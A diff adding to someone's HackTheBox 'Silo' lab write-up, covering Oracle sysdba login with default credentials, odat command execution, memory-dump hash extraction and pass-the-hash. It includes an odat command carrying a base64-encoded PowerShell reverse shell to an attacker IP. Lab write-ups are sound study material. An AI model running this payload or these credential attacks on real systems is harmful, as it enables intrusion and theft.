@@ -1,13 +1,15 @@
 # Silo Helped-Through
 
 Name: Silo
-Date:  
+Date:  19/9/2025
 Difficulty:  Medium
 Goals:  
 - Old OSCP like machine - not harder
 - Is Guided mode good
 Learnt:
 - Sometimes just use metasploit forever and hope 
+- base64 encode files just incase there is a password that is encoded weirdly and decode incorrectly by stdout
+- I need to practice the how could this get me to x in a non-standard way check
 Beyond Root:
 - python2 in the near 2030s...
 - PATH and so libraries 
@@ -316,6 +318,96 @@ PSTUBTBL
 ```
 
 The clue is that we have to login do not have resource permissions so there must be something about the technology and the box that allows you to change it... no you just login `as sysdba`.
+
+```bash
+
+sqlplus scott/tiger@10.129.95.188:1521/XE as sysdba;
+# Looked at this table
+SELECT * FROM SYSTEM_PRIVILEGE_MAP;
+```
+
+Surely I am not using odat correctly...
+![](assysdbaitis.png)
+Looked at the reverse shell in Java.py
+![](sadnessnoimplemented.png)
+
+```powershell
+./odat.py java -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sysdba --exec 'powershell "-nop -Windowstyle hidden -ep bypass -enc $JGEgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjE2MycsODQ0Myk7JGIgPSAkYS5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRjID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkYi5SZWFkKCRjLCAwLCAkYy5MZW5ndGgpKSAtbmUgMCl7OyRkID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYywwLCAkaSk7JGYgPSAoaWV4ICRkIDI+JjEgfCBPdXQtU3RyaW5nICk7JGcgPSAkZiArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJGcpOyRiLldyaXRlKCRlLDAsJGUuTGVuZ3RoKTskYi5GbHVzaCgpfTskYS5DbG9zZSgp"'
+
+[-]] Impossible to use the JAVA library to execute a system command: `ORA-29538: Java not installed`
+
+```
+
+![](notsurethisworks.png)
+
+The problem I foresee uploading a webshell as we cannot execute commands is where the webshell needs to uploaded to
+![](moresadnessnoexec.png)
+Still hope
+![](stillhope.png)
+
+installer is has been served
+![](installerserved.png)
+
+After multiple attempts with quotes, without quotes, with and without `cmd.exe /c`
+I got `odat.py: error: unrecognized arguments`. After reading the DbmsScheduler.py to see how it worked I saw a `getReverseShellPowershellCommand()` and then
+![](hurrayreverseshell.png)
+
+Well the shell was crazy un-interactive and `certutil`, `net` and `whoami`, etc are not in use. Tried to get another reverse shell with metasploit, but was broken. use x64. Uploaded winpeas.bat and got:
+![](notsoawesome.png)
+
+Because Windows 6 is old, I tried x86 version with the plan of hosting it on the webserver to read remotely. Also copy and pasting into locally for later reading. I wanted to at least try PrivEsc without metepreter migration tactics first. Importantly I found the `C:\inetpub\wwwroot\` so while winPEAS was chugging away I thought upload a web shell for finally achieving the two is one malwarejakism and feeling safer. I could always just get another shell with odat, but I might actually gain more utility with a web shell weirdly. 
+
+Neither cmd.asp(x) found in wwwroot or / 
+![](nowebshell.png)
+
+Rough times being had by all, but the silo. The odat reverse shell uses powershell to make the web request, so why I could not run powershell is weird. 
+![](wellthisisgood.png)
+
+Well that is not intended. WinPEAS is still going and has not stdout into the file yet. I do not think I will learn anything by uploading powercat or nc.exe just to get the file - I want to finish this. Started watching Ippsec and around 27 minute that Oracle does not like files over 1024 characters
+![](nopesizeisfine.png)
+
+type "" is better
+![](passwordfound.png)
+
+Tried the link - doubled checked if that is the correct path
+![](incorrectpassword.png)
+
+This is sort of old box weirdness. I would have never understood this. 
+![](iwouldhavenevercheckedthat.png)
+Password still does not work. Lesson learnt that is why everything was encoded in base64 back to attacking machines in books and older cheatsheets, tutorials - stdout encoding. Anyway there is a memory dump and I want this machine finished to move on to another and I do not have a nice DFIR or RevEng VM and I have not used metasploit for 2 years. I decided to try install volatility3 - I have had issues in the past installing this sometimes or modules so I was not tempted originally
+
+Installation rabbitholes are to be avoided
+![](notvolingaround.png)
+
+But 
+![](tearofmetepreter.png)
+
+Looked up how to install volatility3 apparent the bin is called vol.. I am sure it was vol3 or it was some box that had both vol2 and vol3 and vol2 was called vol
+![](andthenamingescapedme.png)
+
+![](ahyesthebadsetuphell.png)
+
+After watching Ippsec press -h I tried again, needed sudo because parrot permission on directory
+```bash
+# No password in the environment variables
+sudo vol -f SILO-20180105-221806.dmp windows.envars.Envars 
+```
+
+![](isitcmdlinenoworky.png)
+
+And then hashdump
+![](nthashshurray.png)
+
+But no crack
+![](sadhashcat.png)
+
+![](passwordrequired.png)
+
+Forgot that pass the hash exists after check the description of Ippsec video
+![](nopsexec.png)
+
+Ippsec uses another old tool. 0xdf uses psexec, but with modern impacket it needs dns resolution for SMB. So lesson learnt there too. - https://medium.com/@v1per/silo-hackthebox-writeup-cec449e0a4bc.
+
 
 ## Beyond Root
 
